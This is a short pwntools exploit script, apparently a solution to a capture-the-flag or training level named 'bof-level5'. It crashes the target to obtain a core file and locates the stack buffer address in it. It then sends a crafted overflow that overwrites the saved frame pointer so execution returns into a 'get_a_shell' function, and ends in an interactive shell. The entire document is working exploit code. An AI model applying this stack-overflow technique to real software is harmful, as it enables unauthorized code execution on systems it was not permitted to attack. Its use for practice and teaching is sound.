from pwn import *

# Set up attack
p = process("./bof-level5")
e = ELF("./bof-level5")
get_a_shell = e.symbols['get_a_shell']

# Create a segfault to get a core file
prog_input = p32(0x78787878) + p32(get_a_shell) + (120 * 'a') + p32(0xffffffff)
p.sendline(prog_input)
p.wait()

# Find buffer start address in the core file
c = Core("./core")
buff = c.stack.find(prog_input)

# Launch real attack.  EBP goes to buffer and EBP + 4 is second return address (get a shell)
prog_input = p32(0x78787878) + p32(get_a_shell) + (120 * 'a') + p32(buff)
p = process("./bof-level5")
print(p.recv(0x200))
p.sendline(prog_input)
p.interactive()
